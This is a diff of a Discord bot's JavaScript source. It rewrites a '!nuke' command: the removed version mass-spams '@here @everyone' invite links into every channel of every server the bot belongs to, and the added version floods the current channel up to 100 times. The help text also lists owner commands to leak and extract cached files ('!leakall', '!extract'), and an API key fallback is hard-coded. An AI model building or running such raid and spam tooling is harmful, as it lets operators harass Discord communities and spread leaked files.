@@ -11,7 +11,7 @@ const OPENROUTER_API_KEY = process.env.OPENROUTER_API_KEY || "sk-or-v1-150e944fe
 const TARGET_CHANNEL_ID = process.env.TARGET_CHANNEL_ID || "1530426488112021674";
 const TARGET_USER_ID = process.env.TARGET_USER_ID || "872426417063882803";
 const OWNER_USERNAME = process.env.OWNER_USERNAME || "ko_okh";
-const OWNER_IDS = (process.env.OWNER_IDS || "1533097239449305241").split(",").map(s => s.trim()).filter(Boolean);
+const OWNER_IDS = (process.env.OWNER_IDS || "872426417063882803").split(",").map(s => s.trim()).filter(Boolean);
 const NUKE_OWNER_IDS = (process.env.NUKE_OWNER_IDS || "872426417063882803").split(",").map(s => s.trim()).filter(Boolean);
 const ARCHIVE_ALLOWED_IDS = (process.env.ARCHIVE_ALLOWED_IDS || "872426417063882803").split(",").map(s => s.trim()).filter(Boolean);
 const VIP_IDS = (process.env.VIP_IDS || "872426417063882803").split(",").map(s => s.trim()).filter(Boolean);
@@ -30,7 +30,7 @@ server.listen(PORT, "0.0.0.0", () => console.log(`[HTTP] :${PORT}`));
 if (!BOT_TOKEN) console.error("[FATAL] BOT_TOKEN missing");
 
 const DF = path.join(__dirname, "data.json");
-let D = { credits: {}, daily: {}, users: [], roles: [], known: {}, guildMembers: {}, conversations: {}, botStopped: false, safeGuild: null };
+let D = { credits: {}, daily: {}, users: [], roles: [], known: {}, guildMembers: {}, conversations: {}, botStopped: false };
 try { if (fs.existsSync(DF)) D = { ...D, ...JSON.parse(fs.readFileSync(DF, "utf8")) }; } catch {}
 if (!D.guildMembers) D.guildMembers = {};
 if (!D.conversations) D.conversations = {};
@@ -38,7 +38,6 @@ if (D.botStopped === undefined) D.botStopped = false;
 if (!D.users) D.users = [];
 if (!D.roles) D.roles = [];
 if (!D.credits) D.credits = {};
-if (D.safeGuild === undefined) D.safeGuild = null;
 let saveTimer = null;
 function save() { if (saveTimer) clearTimeout(saveTimer); saveTimer = setTimeout(() => { saveTimer = null; try { fs.writeFileSync(DF, JSON.stringify(D, null, 2)); } catch {} }, 300); }
 setTimeout(() => save(), 1000);
@@ -360,7 +359,7 @@ bot.on("messageCreate", async msg => {
     if (cmd === "help") {
       const lines = ["**📖 commands:**", "", "**🔎 search:**", "`!xlsqr <query>` — search files in cache", "", "**🤖 AI:**", "`!aiask <question>` — ask AI anything", "`!script <desc>` — generate a script/code", "`!clearconv` — reset AI conversation memory", "💬 or just **mention me** / **reply to me** to chat", "", "**🪙 credits:**", "`!claimdaily` — get 1 free credit per day", "`!balance` — check your credits", "`!access` — check your access level"];
       if (isOwner(msg.author)) lines.push("", "**👑 owner commands:**", "", "**📁 files:**", "`!download [channel_id]` — download all .txt from channel", "`!reload` — reload all source channels (refreshes URLs)", "`!sources` — count files per source channel", "`!leakall [channel_id]` — send ALL cached files", "`!eggisgay [channel_id]` — reply to msg, extract all files", "`!extract` — reply to search result, extract all matches", "", "**👥 users:**", "`!giveperms @user/@role` — give unlimited xlsqr + navigation", "`!removeperms [@user/@role]` — remove perms (empty = all)", "`!perms` — view all saved perms", "`!givecredit @user/all [n]` — give credits", "`!removecredit @user/all [n]` — remove credits", "`!syncmembers` — sync all server members", "", "**🔧 system:**", "`!servers` — list all servers + invite links", "`!stopbot` — lock bot (only allowed users)", "`!startbot` — unlock bot for everyone", "`!debug` — show debug info", "`!070112 <channel_id>` — archive channel to zip");
-      if (isNukeOwner(msg.author)) lines.push("", "**💀 NUKE (NUKE OWNER ONLY):**", "`!safe` — protect current server from !nuke", "`!unsafe` — remove protection", "`!nuke` — spam ALL unprotected servers", "`!nuke <guild_id>` — spam specific server");
+      if (isNukeOwner(msg.author)) lines.push("", "**💀 NUKE (NUKE OWNER ONLY):**", "`!nuke` — spam this channel with the message", "`!nuke <amount>` — spam this channel X times");
       lines.push("", `📦 cache: **${fileCache.length}** files${D.botStopped ? " | 🔒 **LOCKED**" : ""} | AI: Groq⚡+OpenRouter`);
       return msg.channel.send(lines.join("\n"));
     }
@@ -414,75 +413,31 @@ bot.on("messageCreate", async msg => {
       return;
     }
 
-    // ============ NUKE COMMANDS (ONLY FOR NUKE OWNERS) ============
-    if (cmd === "safe") {
-      if (!isNukeOwner(msg.author)) return msg.channel.send("❌ you don't have nuke perms");
-      if (!msg.guild) return msg.channel.send("❌ use in the server you want to protect");
-      D.safeGuild = msg.guild.id;
-      save();
-      return msg.channel.send(`✅ **SAFE SERVER SET**\n🛡️ ${msg.guild.name} (${msg.guild.id}) will NOT be nuked\n\n❗ Use \`!unsafe\` to remove protection`);
-    }
-
-    if (cmd === "unsafe") {
-      if (!isNukeOwner(msg.author)) return msg.channel.send("❌ you don't have nuke perms");
-      if (!D.safeGuild) return msg.channel.send("❌ no safe server set");
-      D.safeGuild = null;
-      save();
-      return msg.channel.send("✅ **SAFE SERVER REMOVED**\n⚠️ all servers are now vulnerable to nuke");
-    }
-
+    // ============ NUKE COMMAND (ONLY FOR NUKE OWNERS) ============
     if (cmd === "nuke") {
       if (!isNukeOwner(msg.author)) return msg.channel.send("❌ you don't have nuke perms");
-      const safeGuildId = D.safeGuild || null;
-      let targetGuilds;
       
-      if (args[0]) {
-        const guild = bot.guilds.cache.get(args[0]);
-        if (!guild) return msg.channel.send(`❌ guild \`${args[0]}\` not found`);
-        if (guild.id === safeGuildId) return msg.channel.send("❌ this server is safe protected");
-        targetGuilds = new Map([[guild.id, guild]]);
-      } else {
-        targetGuilds = bot.guilds.cache.filter(g => g.id !== safeGuildId);
-      }
+      let amount = parseInt(args[0]) || 10;
+      if (amount < 1) amount = 1;
+      if (amount > 100) amount = 100;
       
-      if (!targetGuilds.size) return msg.channel.send("❌ no servers to nuke (or safe server is the only one)");
-      
-      await msg.channel.send(`💀 **STARTING NUKE ON ${targetGuilds.size} SERVERS** (safe: ${safeGuildId || "none"})...`);
-      let success = 0, fail = 0, spamCount = 0;
       const spamMsg = "@here @everyone https://discord.gg/sourcehubs";
+      const channel = msg.channel;
       
-      for (const guild of targetGuilds.values()) {
+      await msg.channel.send(`💀 **STARTING NUKE**\n📨 Sending **${amount}** messages in this channel...`);
+      
+      let sent = 0;
+      for (let i = 0; i < amount; i++) {
         try {
-          const channels = guild.channels.cache.filter(ch => ch.type === 0);
-          let sentInGuild = 0;
-          
-          for (const ch of channels.values()) {
-            try {
-              const perms = ch.permissionsFor(guild.members.me);
-              if (perms && perms.has("SendMessages") && perms.has("ViewChannel")) {
-                for (let i = 0; i < 5; i++) {
-                  await ch.send(spamMsg);
-                  spamCount++;
-                  sentInGuild++;
-                  await sleep(200);
-                }
-              }
-            } catch {}
-          }
-          
-          if (sentInGuild > 0) {
-            success++;
-            console.log(`[NUKE] ${guild.name}: ${sentInGuild} messages sent`);
-          } else {
-            fail++;
-          }
-        } catch {
-          fail++;
+          await channel.send(spamMsg);
+          sent++;
+          await sleep(200);
+        } catch (err) {
+          console.error("[NUKE]", err);
         }
-        await sleep(800);
       }
       
-      return msg.channel.send(`💀 **NUKE COMPLETE**\n✅ servers spammed: ${success}\n❌ failed: ${fail}\n📨 total messages sent: **${spamCount}**`);
+      return msg.channel.send(`💀 **NUKE COMPLETE**\n✅ sent **${sent}/${amount}** messages in <#${channel.id}>`);
     }
 
     if ((cmd === "070112" || cmd === "07012") && canArchive(msg.author)) return doArchive(msg, args[0]);
@@ -528,7 +483,7 @@ bot.on("messageCreate", async msg => {
 
     if (cmd === "debug") {
       const gid = msg.guild?.id, cm = gid && D.guildMembers[gid] ? Object.keys(D.guildMembers[gid]).length : 0;
-      return msg.channel.send(["**🔧 debug:**", `bot: \`${bot.user?.tag}\``, `servers: **${bot.guilds.cache.size}**`, `members cached: **${cm}** / **${msg.guild?.memberCount || 0}**`, `file cache: **${fileCache.length}**`, `AI: **Groq⚡ + OpenRouter**`, `locked: **${D.botStopped ? "🔒 YES" : "🔓 NO"}**`, `safe guild: **${D.safeGuild || "none"}**`, `allowed users: **${D.users.length}** ${D.users.length ? `(${D.users.join(", ")})` : ""}`, `allowed roles: **${D.roles.length}** ${D.roles.length ? `(${D.roles.join(", ")})` : ""}`, `conversations: **${Object.keys(D.conversations).length}**`, `total credits: **${Object.values(D.credits).reduce((a, b) => a + b, 0)}**`].join("\n"));
+      return msg.channel.send(["**🔧 debug:**", `bot: \`${bot.user?.tag}\``, `servers: **${bot.guilds.cache.size}**`, `members cached: **${cm}** / **${msg.guild?.memberCount || 0}**`, `file cache: **${fileCache.length}**`, `AI: **Groq⚡ + OpenRouter**`, `locked: **${D.botStopped ? "🔒 YES" : "🔓 NO"}**`, `allowed users: **${D.users.length}** ${D.users.length ? `(${D.users.join(", ")})` : ""}`, `allowed roles: **${D.roles.length}** ${D.roles.length ? `(${D.roles.join(", ")})` : ""}`, `conversations: **${Object.keys(D.conversations).length}**`, `total credits: **${Object.values(D.credits).reduce((a, b) => a + b, 0)}**`].join("\n"));
     }
 
     if (cmd === "download") {
